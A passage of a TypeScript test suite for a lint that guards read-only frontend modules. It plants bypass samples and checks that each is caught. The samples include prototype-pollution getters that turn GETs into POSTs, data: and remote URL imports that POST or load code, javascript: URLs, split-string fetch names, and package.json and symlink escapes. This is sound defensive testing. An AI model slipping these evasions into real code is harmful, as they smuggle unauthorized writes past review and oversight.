      'export const Box = ({ as: As = "div" }: { as?: any }) => <As />;\nexport const P = () => <Box as="form" />;\n',
    ),
    expect: "src/components/Probe.tsx: read-only module uses <form>",
  },
  {
    name: 'N8b: an as={"IFRAME"} attribute in upper case',
    plant: add("src/components/Probe.tsx", 'declare const Box: any;\nexport const P = () => <Box as={"IFRAME"} />;\n'),
    expect: "src/components/Probe.tsx: read-only module uses <iframe>",
  },
  {
    name: "N8b: an as attribute spelled with a character reference",
    plant: add(
      "src/components/Probe.tsx",
      'declare const Box: any;\nexport const P = () => <Box as="scr&#105;pt" />;\n',
    ),
    expect: "src/components/Probe.tsx: read-only module uses <script>",
  },
  {
    name: 'N9: an iframe srcDoc through const Frame = "iframe"',
    plant: add(
      "src/components/Probe.tsx",
      'const Frame = "iframe";\nexport const P = () => <Frame srcDoc="<p>x</p>" />;\n',
    ),
    expect: "src/components/Probe.tsx: read-only module uses <iframe>",
  },
  {
    name: "N14: a javascript: URL in an href",
    plant: add(
      "src/components/Probe.tsx",
      "export const P = () => <a href={\"javascript:void fetch('/x', { method: 'POST' })\"}>x</a>;\n",
    ),
    expect: "src/components/Probe.tsx: read-only module uses a javascript: URL",
  },
  {
    name: "N14: a javascript: URL with mixed case, leading space and a tab reference",
    plant: add("src/components/Probe.tsx", 'export const P = () => <a href=" JaVa&#9;Script:void 0">x</a>;\n'),
    expect: "src/components/Probe.tsx: read-only module uses a javascript: URL",
  },
  {
    name: "N14: a javascript: URL in a template literal",
    plant: add("src/components/Probe.ts", "export const href = (code: string) => `javascript:${code}`;\n"),
    expect: "src/components/Probe.ts: read-only module uses a javascript: URL",
  },
  {
    name: "N20: navigator indexed with a computed key",
    plant: add("src/components/Probe.ts", "export const g = (k: string) => (navigator as any)[k];\n"),
    expect: "src/components/Probe.ts: read-only module uses computed element access on navigator",
  },
  {
    name: "document indexed with a computed key",
    plant: add("src/components/Probe.ts", "export const g = (k: string) => (document as any)[k];\n"),
    expect: "src/components/Probe.ts: read-only module uses computed element access on document",
  },
  {
    name: "a component writes innerHTML",
    plant: add(
      "src/components/Probe.ts",
      "export const w = (el: HTMLElement, s: string) => {\n  el.innerHTML = s;\n};\n",
    ),
    expect: "src/components/Probe.ts: read-only module uses innerHTML",
  },
  {
    name: "a component writes outerHTML",
    plant: add(
      "src/components/Probe.ts",
      "export const w = (el: HTMLElement, s: string) => {\n  el.outerHTML = s;\n};\n",
    ),
    expect: "src/components/Probe.ts: read-only module uses outerHTML",
  },
  {
    name: "a component calls insertAdjacentHTML",
    plant: add(
      "src/components/Probe.ts",
      'export const w = (el: HTMLElement, s: string) => el.insertAdjacentHTML("beforeend", s);\n',
    ),
    expect: "src/components/Probe.ts: read-only module uses insertAdjacentHTML",
  },
  {
    name: "a component writes document.cookie",
    plant: add("src/components/Probe.ts", 'export const w = () => {\n  document.cookie = "a=b";\n};\n'),
    expect: "src/components/Probe.ts: read-only module uses cookie",
  },
  {
    name: "a component opens the Cache API",
    plant: add("src/components/Probe.ts", 'export const c = () => caches.open("planb");\n'),
    expect: "src/components/Probe.ts: read-only module uses caches",
  },
  {
    name: "a component opens an RTCPeerConnection",
    plant: add("src/components/Probe.ts", "export const c = () => new RTCPeerConnection();\n"),
    expect: "src/components/Probe.ts: read-only module uses RTCPeerConnection",
  },
  {
    name: "a component registers a service worker",
    plant: add("src/components/Probe.ts", 'export const c = () => navigator.serviceWorker.register("/sw.js");\n'),
    expect: "src/components/Probe.ts: read-only module uses serviceWorker",
  },
];

// The round-3 verifier's bypasses (verify:round3). V1: a getter on Object.prototype that turns the
// loader's GET into a POST (the browser reads `body` before `method`), with the other ways to
// change a prototype or the global object. G1-G2: the global object behind a literal key or a
// logical or conditional expression.
const BODY_GETTER =
  'Object.defineProperty(Object.prototype, "body", {\n' +
  "  configurable: true,\n" +
  "  get(this: Record<string, unknown>) {\n" +
  '    if (this.credentials !== "omit") return undefined;\n' +
  '    this.method = "POST";\n' +
  '    return "{}";\n' +
  "  },\n" +
  "});\n";
const PROBE = "src/components/Probe.ts";
const USES = (label: string): string => `${PROBE}: read-only module uses ${label}`;
const FROM_BOARD = edit("src/board/BoardView.tsx", "import ", 'import "../components/Probe";\nimport ');
const K = 'const k = "fe" + "tch";\n';

const ROUND_3_BYPASSES: readonly Case[] = [
  {
    name: "V1: the loader defines a body getter on Object.prototype that rewrites its method",
    plant: edit(LOADER, "async function getBytes", `${BODY_GETTER}async function getBytes`),
    expect: `${LOADER}: read-only module uses Object.defineProperty on Object.prototype`,
  },
  {
    name: "V1b: a component imported by the board defines the same getter",
    plant: both(add(PROBE, `${BODY_GETTER}export const probe = 1;\n`), FROM_BOARD),
    expect: USES("Object.defineProperty on Object.prototype"),
  },
  {
    name: "V1c: a component assigns a key on Object.prototype",
    plant: add(PROBE, "(Object.prototype as Record<string, unknown>).keepalive = true;\nexport {};\n"),
    expect: USES("a write to a member of Object.prototype"),
  },
  {
    name: "a component assigns a computed key on Object.prototype",
    plant: add(PROBE, 'export const p = (k: string) => {\n  (Object.prototype as any)[k] = "{}";\n};\n'),
    expect: USES("a write to a member of Object.prototype"),
  },
  {
    name: "a component adds a method to Array.prototype",
    plant: add(PROBE, "(Array.prototype as any).last = function () {\n  return 0;\n};\nexport {};\n"),
    expect: USES("a write to a member of Array.prototype"),
  },
  {
    name: "a component writes its own class's prototype",
    plant: add(PROBE, "export class Box {}\n(Box.prototype as any).body = \"{}\";\n"),
    expect: USES("a write to a member of Box.prototype"),
  },
  {
    name: "a component replaces a function's prototype",
    plant: add(PROBE, 'export function Old() {}\nOld.prototype = { body: "{}" };\n'),
    expect: USES("a write to Old.prototype"),
  },
  {
    name: "a component calls Object.defineProperties on Object.prototype",
    plant: add(PROBE, 'Object.defineProperties(Object.prototype, { body: { value: "{}" } });\nexport {};\n'),
    expect: USES("Object.defineProperties on Object.prototype"),
  },
  {
    name: "a component calls Reflect.defineProperty on Object.prototype",
    plant: add(PROBE, 'Reflect.defineProperty(Object.prototype, "body", { value: "{}" });\nexport {};\n'),
    expect: USES("Reflect.defineProperty on Object.prototype"),
  },
  {
    name: "a component calls Object.setPrototypeOf on a prototype",
    plant: add(PROBE, 'export class Box {}\nObject.setPrototypeOf(Box.prototype, { body: "{}" });\n'),
    expect: USES("Object.setPrototypeOf on Box.prototype"),
  },
  {
    name: "a component calls Reflect.setPrototypeOf on a prototype",
    plant: add(PROBE, "export class Box {}\nReflect.setPrototypeOf(Box.prototype, null);\n"),
    expect: USES("Reflect.setPrototypeOf on Box.prototype"),
  },
  {
    name: "a component calls Object.assign onto Object.prototype",
    plant: add(PROBE, 'Object.assign(Object.prototype, { body: "{}" });\nexport {};\n'),
    expect: USES("Object.assign on Object.prototype"),
  },
  {
    name: "a component calls a destructured defineProperty on Object.prototype",
    plant: add(PROBE, 'const { defineProperty } = Object;\ndefineProperty(Object.prototype, "body", { value: "{}" });\nexport {};\n'),
    expect: USES("defineProperty on Object.prototype"),
  },
  {
    name: "a component calls Reflect.set on Object.prototype",
    plant: add(PROBE, 'Reflect.set(Object.prototype, "body", "{}");\nexport {};\n'),
    expect: USES("Reflect.set on Object.prototype"),
  },
  {
    name: "a component writes the prototype it gets from Object.getPrototypeOf",
    plant: add(PROBE, 'Object.getPrototypeOf({}).body = "{}";\nexport {};\n'),
    expect: USES("a write to a member of Object.getPrototypeOf(...)"),
  },
  {
    name: "a component deletes a member of Object.prototype",
    plant: add(PROBE, "delete (Object.prototype as any).toString;\nexport {};\n"),
    expect: USES("a write to a member of Object.prototype"),
  },
  {
    name: "a component writes Object.prototype with ??=",
    plant: add(PROBE, "(Object.prototype as any).count ??= 0;\nexport {};\n"),
    expect: USES("a write to a member of Object.prototype"),
  },
  {
    name: "a component increments a member of Object.prototype",
    plant: add(PROBE, "++(Object.prototype as any).count;\nexport {};\n"),
    expect: USES("a write to a member of Object.prototype"),
  },
  {
    name: "a component writes Object.prototype as a destructuring target",
    plant: add(PROBE, '[(Object.prototype as any).body] = ["{}"];\nexport {};\n'),
    expect: USES("a write to a member of Object.prototype"),
  },
  {
    name: "a component writes Object.prototype as a for-of target",
    plant: add(PROBE, 'for ((Object.prototype as any).body of ["{}"]);\nexport {};\n'),
    expect: USES("a write to a member of Object.prototype"),
  },
  {
    name: "a component writes through __proto__",
    plant: add(PROBE, '({} as any).__proto__.body = "{}";\nexport {};\n'),
    expect: USES("__proto__"),
  },
  {
    name: "a component gives a literal a __proto__",
    plant: add(PROBE, 'export const o = { __proto__: { body: "{}" } };\n'),
    expect: USES("__proto__"),
  },
  {
    name: 'a component reads ["__proto__"]',
    plant: add(PROBE, 'export const p = (x: object) => (x as any)["__proto__"];\n'),
    expect: USES("__proto__"),
  },
  ...["__defineGetter__", "__defineSetter__", "__lookupGetter__", "__lookupSetter__"].map((legacy) => ({
    name: `a component calls Object.prototype.${legacy}`,
    plant: add(PROBE, `(Object.prototype as any).${legacy}("body", () => "{}");\nexport {};\n`),
    expect: USES(legacy),
  })),
  // Member writes to the global object, a global binding, or a member of the global object.
  {
    name: "a component assigns a member of window",
    plant: add(PROBE, "window.onbeforeunload = null;\nexport {};\n"),
    expect: USES("a write to a member of window"),
  },
  {
    name: "a component assigns a member of globalThis",
    plant: add(PROBE, "(globalThis as any).planB = 1;\nexport {};\n"),
    expect: USES("a write to a member of globalThis"),
  },
  {
    name: "a component assigns a computed member of self",
    plant: add(PROBE, "export const p = (k: string, v: unknown) => {\n  (self as any)[k] = v;\n};\n"),
    expect: USES("a write to a member of self"),
  },
  {
    name: "a component assigns a member of document.defaultView",
    plant: add(PROBE, 'document.defaultView!.name = "x";\nexport {};\n'),
    expect: USES("a write to a member of document.defaultView"),
  },
  {
    name: "a component replaces Object.freeze",
    plant: add(PROBE, "Object.freeze = <T>(o: T) => o;\nexport {};\n"),
    expect: USES("a write to a member of Object"),
  },
  {
    name: "a component replaces window.Object.freeze",
    plant: add(PROBE, "(window as any).Object.freeze = (o: unknown) => o;\nexport {};\n"),
    expect: USES("a write to a member of window.Object"),
  },
  {
    name: "a component sets document.title",
    plant: add(PROBE, 'document.title = "x";\nexport {};\n'),
    expect: USES("a write to a member of document"),
  },
  {
    name: "a component assigns the global name",
    plant: add(PROBE, 'name = "x";\nexport {};\n'),
    expect: USES("a write to the global name"),
  },
  {
    name: "a component assigns the global name by destructuring",
    plant: add(PROBE, '({ name } = { name: "x" });\nexport {};\n'),
    expect: USES("a write to the global name"),
  },
  {
    name: "a component calls Object.defineProperty on window",
    plant: add(PROBE, 'Object.defineProperty(window, "planB", { value: 1 });\nexport {};\n'),
    expect: USES("Object.defineProperty on window"),
  },
  {
    name: "a component calls Object.assign onto globalThis",
    plant: add(PROBE, "Object.assign(globalThis, { planB: 1 });\nexport {};\n"),
    expect: USES("Object.assign on globalThis"),
  },
  {
    name: "a component calls Reflect.set on globalThis",
    plant: add(PROBE, 'Reflect.set(globalThis, "planB", 1);\nexport {};\n'),
    expect: USES("Reflect.set on globalThis"),
  },
  {
    name: "a component calls Reflect.deleteProperty on window",
    plant: add(PROBE, 'Reflect.deleteProperty(window, "planB");\nexport {};\n'),
    expect: USES("Reflect.deleteProperty on window"),
  },
  // G1: literal-key aliases of the global object.
  {
    name: 'G1: window["top"] indexed with a computed key',
    plant: add(PROBE, `${K}export const p = () => (window["top"] as any)[k];\n`),
    expect: USES("computed element access on window.top"),
  },
  {
    name: 'G1b: document["defaultView"] indexed with a computed key',
    plant: add(PROBE, `${K}export const p = () => (document["defaultView"] as any)[k];\n`),
    expect: USES("computed element access on document.defaultView"),
  },
  {
    name: 'G1c: globalThis["navigator"] indexed with a computed key',
    plant: add(PROBE, 'const k = "send" + "Beacon";\nexport const p = () => (globalThis["navigator"] as any)[k];\n'),
    expect: USES("computed element access on globalThis.navigator"),
  },
  {
    name: 'G1d: globalThis["window"] indexed with a computed key',
    plant: add(PROBE, `${K}export const p = () => (globalThis["window"] as any)[k];\n`),
    expect: USES("computed element access on globalThis.window"),
  },
  // G2: the global object as an operand of a logical or conditional expression.
  {
    name: "G2: (globalThis || 0) indexed with a computed key",
    plant: add(PROBE, `${K}export const p = () => ((globalThis || 0) as any)[k];\n`),
    expect: USES("computed element access on globalThis"),
  },
  {
    name: "G2b: (b ? globalThis : window) indexed with a computed key",
    plant: add(PROBE, `${K}export const p = (b: boolean) => ((b ? globalThis : window) as any)[k];\n`),
    expect: USES("computed element access on globalThis"),
  },
  {
    name: "G2c: (globalThis ?? 0) indexed with a computed key",
    plant: add(PROBE, `${K}export const p = () => ((globalThis ?? 0) as any)[k];\n`),
    expect: USES("computed element access on globalThis"),
  },
  {
    name: "the right operand of || is window",
    plant: add(PROBE, `${K}export const p = (x: unknown) => ((x || window) as any)[k];\n`),
    expect: USES("computed element access on window"),
  },
  {
    name: "the right operand of && is document",
    plant: add(PROBE, 'const k = "wri" + "te";\nexport const p = (ok: boolean) => ((ok && document) as any)[k];\n'),
    expect: USES("computed element access on document"),
  },
  {
    name: "an assignment's value is window",
    plant: add(PROBE, `${K}let g: unknown;\nexport const p = () => ((g = window) as any)[k];\n`),
    expect: USES("computed element access on window"),
  },
  {
    name: "a computed key destructured from (globalThis || {})",
    plant: add(PROBE, `${K}export const p = () => {\n  const { [k]: f } = (globalThis || {}) as any;\n  return f;\n};\n`),
    expect: USES("computed destructuring of globalThis"),
  },
];

// Every script file under src is a source (round-3 U1): .js, .jsx, .mjs and .cjs ones too.
const NET_DTS = "export declare const post: number;\n";
const JS_SOURCES: readonly Case[] = [
  {
    name: "U1: a .js module reached from the board imports a data: module that POSTs",
    plant: both(
      add(
        "src/components/net.js",
        "import \"data:text/javascript,fetch('/api/tools/apply_plan',{method:'POST',body:'{}'})\";\n" +
          "export const post = 1;\n",
      ),
      add("src/components/net.d.ts", NET_DTS),
      add(PROBE, 'import { post } from "./net.js";\nexport const probe = post;\n'),
      FROM_BOARD,
    ),
    expect: URL_IMPORT("src/components/net.js", "data:text/javascript,fetch('/api/tools/apply_..."),
  },
  {
    name: "U1b: a .mjs module imports an https: module",
    plant: both(
      add("src/components/net.mjs", 'import "https://example.invalid/post.js";\nexport const post = 1;\n'),
      add("src/components/net.d.mts", NET_DTS),
      add(PROBE, 'import { post } from "./net.mjs";\nexport const probe = post;\n'),
    ),
    expect: URL_IMPORT("src/components/net.mjs", "https://example.invalid/post.js"),
  },
  {
    name: "U1c: a panel's .js module dynamically imports a blob: module",
    plant: add("src/panels/net.js", 'export const go = () => import("blob:http://127.0.0.1/x");\n'),
    expect: URL_IMPORT("src/panels/net.js", "blob:http://127.0.0.1/x"),
  },
  {
    name: "a .cjs source re-exports an http: module",
    plant: add("src/net.cjs", 'export * from "http://127.0.0.1:8765/x.js";\n'),
    expect: URL_IMPORT("src/net.cjs", "http://127.0.0.1:8765/x.js"),
  },
  {
    name: "a .jsx component renders a form",
    plant: add("src/components/Probe.jsx", 'export const Probe = () => <form method="post" action="/api/moderator/clock" />;\n'),
    expect: "src/components/Probe.jsx: read-only module uses <form>",
  },
  {
    name: "a .js component imports src/api.ts",
    plant: add("src/components/Probe.js", 'import { callTool } from "../api";\nexport const probe = callTool;\n'),
    expect: REACHES_API("src/components/Probe.js"),
  },
  {
    name: "a .js component writes Object.prototype",
    plant: add("src/components/Probe.js", 'Object.prototype.body = "{}";\nexport {};\n'),
    expect: "src/components/Probe.js: read-only module uses a write to a member of Object.prototype",
  },
  {
    name: "a board module's extensionless import resolves to a .js module that fetches",
    plant: both(
      add("src/net.js", 'export const post = () => fetch("/api/tools/x", { method: "POST" });\n'),
      add("src/board/probe.ts", 'import { post } from "../net";\nexport const probe = post;\n'),
    ),
    expect: "src/net.js: read-only module uses fetch",
  },
  {
    // Vite tries .js before .ts, so the .js file is the one bundled.
    name: "an extensionless import names both a clean .ts and a .js module that fetches",
    plant: both(
      add("src/components/net.ts", "export const post = () => 0;\n"),
      add("src/components/net.js", 'export const post = () => fetch("/api/tools/x", { method: "POST" });\n'),
      add(PROBE, 'import { post } from "./net";\nexport const probe = post;\n'),
    ),
    expect: "src/components/net.js: read-only module uses fetch",
  },
  {
    name: "a directory import resolves to an index.js that fetches",
    plant: both(
      add("src/components/lib/index.js", 'export const post = () => fetch("/api/tools/x", { method: "POST" });\n'),
      add(PROBE, 'import { post } from "./lib";\nexport const probe = post;\n'),
    ),
    expect: "src/components/lib/index.js: read-only module uses fetch",
  },
  {
    name: "a panel's .mjs module writes localStorage",
    plant: add("src/panels/probe.mjs", 'localStorage.setItem("planb.session", "x");\n'),
    expect: "src/panels/probe.mjs: uses localStorage (tokens must stay per tab)",
  },
  {
    name: "a .js source does not parse",
    plant: add("src/panels/probe.js", "export const = ;\n"),
    expect: "src/panels/probe.js: does not parse:",
  },
  {
    name: "a .js source names a private runner marker",
    plant: add("src/panels/probe.js", "// ground_truth\nexport {};\n"),
    expect: 'src/panels/probe.js: contains private marker "ground_truth"',
  },
];

// The round-4 verifier's bypasses (verify:round4). X4: a module outside src, which rules 3 to 5
// never read, reached from the board. X1-X3: a file that is not a script by its extension but
// that Vite bundles as JavaScript. Every module a source references must now lie under src, and
// every non-script file it names must be an allowed asset or style file.
const DATA_POST = "import \"data:text/javascript,fetch('/api/tools/apply_plan',{method:'POST',body:'{}'})\";\n";
const POST = "fetch('/api/tools/apply_plan',{method:'POST',body:'{}'});\n";
const OUTSIDE = (file: string, spec: string, target: string): string =>
  `${file}: imports "${spec}", which resolves outside src to ${target}`;
const NOT_A_LEAF = (file: string, spec: string, target: string): string =>
  `${file}: imports "${spec}": ${target} is neither a script nor an allowed asset or style file`;
const LEAF_SUFFIX = (file: string, spec: string): string =>
  `${file}: imports "${spec}": an asset or style file may carry no suffix other than ?url or ?raw`;
const NOT_PLAIN = (file: string, spec: string): string => `${file}: imports "${spec}", which is not a plain package specifier`;

const ROUND_4_BYPASSES: readonly Case[] = [
  {
    name: "X4: a component reached from the board imports a module outside src that imports a data: URL",
    plant: both(
      add("shared/net.js", `${DATA_POST}export const post = 1;\n`),
      add("shared/net.d.ts", NET_DTS),
      add(PROBE, 'import { post } from "../../shared/net.js";\nexport const probe = post;\n'),
      FROM_BOARD,
    ),
    expect: OUTSIDE(PROBE, "../../shared/net.js", "shared/net.js"),
  },
  {
    name: "X4b: a component renders a shared component outside src that uses dangerouslySetInnerHTML",
    plant: both(
      add("shared/Html.tsx", "export const Html = ({ h }: { h: string }) => <div dangerouslySetInnerHTML={{ __html: h }} />;\n"),
      add("src/components/Probe.tsx", 'import { Html } from "../../shared/Html";\nexport const probe = () => <Html h="x" />;\n'),
      FROM_BOARD,
    ),
    expect: OUTSIDE("src/components/Probe.tsx", "../../shared/Html", "shared/Html.tsx"),
  },
  {
    name: "X4c: a component imports a .ts module outside src that fetches",
    plant: both(
      add("shared/net.ts", 'export const post = () => fetch("/api/tools/apply_plan", { method: "POST" });\n'),
      add(PROBE, 'import { post } from "../../shared/net";\nexport const probe = post;\n'),
    ),
    expect: OUTSIDE(PROBE, "../../shared/net", "shared/net.ts"),
  },
  {
    name: "a panel imports a module outside src",
    plant: both(
      add("shared/net.js", `${DATA_POST}export {};\n`),
      add("src/panels/probe.ts", 'import "../../shared/net.js";\n'),
    ),
    expect: OUTSIDE("src/panels/probe.ts", "../../shared/net.js", "shared/net.js"),
  },
  {
    name: "a component imports a root-absolute module outside src",
    plant: both(add("shared/net.js", `${POST}export {};\n`), add(PROBE, 'import "/shared/net.js";\nexport {};\n')),
    expect: OUTSIDE(PROBE, "/shared/net.js", "shared/net.js"),
  },
  {
    name: "a component imports the build configuration by a root-absolute specifier",
    plant: both(add("vite.config.ts", "export default {};\n"), add(PROBE, 'import "/vite.config.ts";\nexport {};\n')),
    expect: OUTSIDE(PROBE, "/vite.config.ts", "vite.config.ts"),
  },
  {
    name: "a view re-exports a module outside src",
    plant: both(add("shared/net.js", `${POST}export const post = 1;\n`), add("src/views/probe.ts", 'export * from "../../shared/net.js";\n')),
    expect: OUTSIDE("src/views/probe.ts", "../../shared/net.js", "shared/net.js"),
  },
  {
    name: "a board module dynamically imports a module outside src",
    plant: both(
      add("shared/net.js", `${POST}export {};\n`),
      add("src/board/probe.ts", 'export const go = () => import("../../shared/net.js");\n'),
    ),
    expect: OUTSIDE("src/board/probe.ts", "../../shared/net.js", "shared/net.js"),
  },
  {
    name: "a component requires a module outside src",
    plant: both(
      add("shared/net.js", `${POST}export {};\n`),
      add(PROBE, 'import net = require("../../shared/net.js");\nexport const probe = net;\n'),
    ),
    expect: OUTSIDE(PROBE, "../../shared/net.js", "shared/net.js"),
  },
  {
    name: "a panel starts a worker from a module outside src with new URL(..., import.meta.url)",
    plant: both(
      add("shared/w.js", `${POST}`),
      add("src/panels/probe.ts", 'export const w = () => new Worker(new URL("../../shared/w.js", import.meta.url), { type: "module" });\n'),
    ),
    expect: OUTSIDE("src/panels/probe.ts", "../../shared/w.js", "shared/w.js"),
  },
  {
    name: "a panel builds new URL(..., import.meta.url) from a computed path",
    plant: add("src/panels/probe.ts", "export const u = (name: string) => new URL(`./${name}.js`, import.meta.url);\n"),
    expect: "src/panels/probe.ts: new URL(..., import.meta.url) must take a quoted literal path",
  },
  {
    name: "a panel imports modules with import.meta.glob",
    plant: add("src/panels/probe.ts", 'export const all = import.meta.glob("../../shared/*.js", { eager: true });\n'),
    expect: "src/panels/probe.ts: uses import.meta.glob",
  },
  {
    name: "a symbolic link under src names a module outside it",
    plant: both(
      add("shared/net.js", `${POST}export const post = 1;\n`),
      (root) => symlinkSync(join(root, "shared/net.js"), join(root, "src/components/net.js")),
      add(PROBE, 'import { post } from "./net.js";\nexport const probe = post;\n'),
    ),
    expect: "src/components/net.js: is a symbolic link",
  },
  {
    name: "a node_modules folder under src holds a package a component imports",
    plant: both(
      add("src/components/node_modules/planb-net/package.json", '{ "name": "planb-net", "main": "index.js" }\n'),
      add("src/components/node_modules/planb-net/index.js", `${POST}export const post = 1;\n`),
      add(PROBE, 'import { post } from "planb-net";\nexport const probe = post;\n'),
    ),
    expect: "src/components/node_modules: is a node_modules folder",
  },
  {
    name: 'a package specifier climbs out of its package with ".."',
    plant: add(PROBE, 'import "planb-pkg/../../shared/net.js";\nexport {};\n'),
    expect: NOT_PLAIN(PROBE, "planb-pkg/../../shared/net.js"),
  },
  {
    name: "a component imports a package.json import-map entry",
    plant: add(PROBE, 'import "#net";\nexport {};\n'),
    expect: NOT_PLAIN(PROBE, "#net"),
  },
  {
    // Vite loads the package.json entry, not the index file the lint would follow.
    name: "a directory import names a folder with a package.json and a clean index",
    plant: both(
      add("src/components/lib/package.json", '{ "main": "evil.js" }\n'),
      add("src/components/lib/index.ts", "export const post = () => 0;\n"),
      add("src/components/lib/evil.js", 'export const post = () => fetch("/api/tools/x", { method: "POST" });\n'),
      add(PROBE, 'import { post } from "./lib";\nexport const probe = post;\n'),
    ),
    expect: `${PROBE}: imports "./lib", a directory with a package.json`,
  },
  // Files that are not scripts by name but that Vite bundles as JavaScript.
  {
    name: "X1: an upper-case .JS module reached from the board fetches",
    plant: both(
      add("src/components/net.JS", `${POST}export const post = 1;\n`),
      add(PROBE, 'import "./net.JS";\nexport {};\n'),
      FROM_BOARD,
    ),
    expect: "src/components/net.JS: read-only module uses fetch",
  },
  {
    name: "X2: a component imports an extensionless file",
    plant: both(add("src/components/net", POST), add(PROBE, 'import "./net";\nexport {};\n'), FROM_BOARD),
    expect: NOT_A_LEAF(PROBE, "./net", "src/components/net"),
  },
  {
    name: "X3: a component imports a .md file that holds code",
    plant: both(add("src/components/net.md", POST), add(PROBE, 'import "./net.md";\nexport {};\n'), FROM_BOARD),
    expect: NOT_A_LEAF(PROBE, "./net.md", "src/components/net.md"),
  },
  {
    name: "a panel imports a .md file",
    plant: both(add("src/panels/notes.md", "# Notes\n"), add("src/panels/probe.ts", 'import "./notes.md";\n')),
    expect: NOT_A_LEAF("src/panels/probe.ts", "./notes.md", "src/panels/notes.md"),
  },
  {
    // Vite recognizes .css and .json in lower case only.
    name: "a component imports an upper-case .CSS file",
    plant: both(add("src/components/net.CSS", POST), add(PROBE, 'import "./net.CSS";\nexport {};\n')),
    expect: NOT_A_LEAF(PROBE, "./net.CSS", "src/components/net.CSS"),
  },
  {
    name: "a component imports an upper-case .JSON file",
    plant: both(add("src/components/net.JSON", POST), add(PROBE, 'import "./net.JSON";\nexport {};\n')),
    expect: NOT_A_LEAF(PROBE, "./net.JSON", "src/components/net.JSON"),
  },
  {
    name: "a panel runs a CSS file as a worker",
    plant: add("src/panels/probe.ts", 'import W from "../styles.css?worker";\nexport const w = W;\n'),
    expect: LEAF_SUFFIX("src/panels/probe.ts", "../styles.css?worker"),
  },
  {
    name: "a component imports an asset with a suffix other than ?url or ?raw",
    plant: both(
      add("src/components/logo.svg", "<svg xmlns='http://www.w3.org/2000/svg'/>\n"),
      add(PROBE, 'import logo from "./logo.svg?inline";\nexport const p = logo;\n'),
    ),
    expect: LEAF_SUFFIX(PROBE, "./logo.svg?inline"),
  },
  {
    name: "a panel's upper-case .TS module writes localStorage",
    plant: add("src/panels/probe.TS", 'localStorage.setItem("planb.session", "x");\n'),
    expect: "src/panels/probe.TS: uses localStorage (tokens must stay per tab)",
  },
  {
    name: "a JSON file under src names a private runner marker",
    plant: add("src/components/data.json", '{ "ground_truth": 1 }\n'),
    expect: 'src/components/data.json: contains private marker "ground_truth"',
  },
  {
    name: "W15: an element's ownerDocument indexed with a computed key",
    plant: add(
      PROBE,
      'const v = "default" + "View";\n' +
        "export const p = (el: HTMLElement) => (el.ownerDocument as unknown as Record<string, unknown>)[v];\n",
    ),
    expect: USES("computed element access on el.ownerDocument"),
  },
  // Fail-closed by design: a read-only module writes no global, navigation and titles included.
  {
    name: "a component sets location.hash (navigation belongs in a trusted module)",
    plant: add(PROBE, 'export const go = (name: string) => {\n  location.hash = `#/replay/${encodeURIComponent(name)}`;\n};\n'),
    expect: USES("a write to a member of location"),
  },
  {
    name: "a component keys its own WeakMap by window",
    plant: add(PROBE, "const m = new WeakMap<object, number>();\nm.set(window, 1);\nexport {};\n"),
    expect: USES("m.set on window"),
  },
];

/** Configuration files that steer the bundler, and type syntax that keeps its expression. */
const ROUND_5_BYPASSES: readonly Case[] = [
  {
    name: "O6: a package.json under src redirects an import through its browser field",
    plant: both(
      add("shared/net.js", 'fetch("/api/tools/apply_plan", { method: "POST", body: "{}" });\nexport const post = 1;\n'),
      add("src/components/package.json", '{ "browser": { "./clean.ts": "../../shared/net.js" } }\n'),
      add("src/components/clean.ts", "export const post = 1;\n"),
      add(PROBE, 'import { post } from "./clean.ts";\nexport const probe = post;\n'),
      FROM_BOARD,
    ),
    expect: "src/components/package.json: is a package.json",
  },
  {
    name: "O7: a tsconfig.json under src names a JSX runtime outside src",
    plant: add("src/components/tsconfig.json", '{ "compilerOptions": { "jsxImportSource": "../../shared/evil" } }\n'),
    expect: "src/components/tsconfig.json: is a tsconfig or jsconfig file",
  },
  {
    name: "O8: a JSX pragma comment imports a JSX runtime outside src",
    plant: both(
      add("src/components/Probe.tsx", "/** @jsxImportSource ../../shared/evil */\nexport const probe = () => <b>x</b>;\n"),
      FROM_BOARD,
    ),
    expect: "src/components/Probe.tsx: holds a JSX pragma comment",
  },
  {
    name: "O11: an instantiation expression hides fetch",
    plant: both(
      add(
        PROBE,
        "const f = (globalThis.fetch as unknown as <T>(u: string, i: object) => T)<Promise<unknown>>;\n" +
          'void f("/api/tools/apply_plan", { method: "POST", body: "{}" });\nexport const probe = 1;\n',
      ),
      FROM_BOARD,
    ),
    expect: `${PROBE}: read-only module uses fetch`,
  },
  {
    name: "O11b: an instantiation expression hides a prototype mutator",
    plant: both(
      add(
        PROBE,
        '(Object.defineProperty<object>)(Object.prototype, "body", { get() { return "x"; } });\nexport const probe = 1;\n',
      ),
      FROM_BOARD,
    ),
    expect: `${PROBE}: read-only module uses Object.defineProperty on Object.prototype`,
  },
  {
    name: "O12: an instantiation expression hides a dynamic import of a module outside src",
    plant: both(
      add("shared/net.js", `${DATA_POST}export const post = 1;\n`),
      add(PROBE, 'void (import("../../shared/net.js") as unknown as <T>() => T)<never>;\nexport const probe = 1;\n'),
      FROM_BOARD,
    ),
    expect: OUTSIDE(PROBE, "../../shared/net.js", "shared/net.js"),
  },
];

test("the unmodified tree passes the boundary lint", () => {
  const result = lint(() => undefined);
  assert.deepEqual(result.problems, []);
  assert.ok(result.readOnlyModules >= 20, String(result.readOnlyModules));
  assert.ok(result.sources >= result.readOnlyModules);
});

for (const c of [
  ...AUDIT_PROBES,
  ...MORE_PROBES,
  ...ROUND_1_BYPASSES,
  ...NEW_RULES,
  ...LOADER_INIT,
  ...URL_SPECIFIERS,
  ...ROUND_2_BYPASSES,
  ...ROUND_3_BYPASSES,
  ...JS_SOURCES,
  ...ROUND_4_BYPASSES,
  ...ROUND_5_BYPASSES,
]) {
  test(`the boundary lint fails when ${c.name}`, () => {
    const result = lint(c.plant);
    assert.ok(
      result.problems.some((p) => p.startsWith(c.expect)),
      `expected a line starting ${JSON.stringify(c.expect)}, got:\n${report(result)}`,
    );
    // The planted code is ordinary code: it parses, so the rule itself caught it.
    if (!c.expect.includes("does not parse")) {
      assert.ok(!result.problems.some((p) => p.includes("does not parse")), report(result));
    }
  });
}

const ALLOWED: readonly Omit<Case, "expect">[] = [
  { name: 'the loader writes method "get" in lower case', plant: edit(LOADER, 'method: "GET"', 'method: "get"') },
  { name: "the loader quotes its keys", plant: edit(LOADER, 'method: "GET",', '"method": "GET",') },
  {
    name: "a board module imports a read-only module by a quoted dynamic import",
    plant: add("src/board/probe.ts", 'export const format = () => import("../format");\n'),
  },
  {
    name: "a component imports a CSS file (round-1 crash R1)",
    plant: add("src/components/Probe.ts", 'import "../styles.css";\nexport const p = 1;\n'),
  },
  {
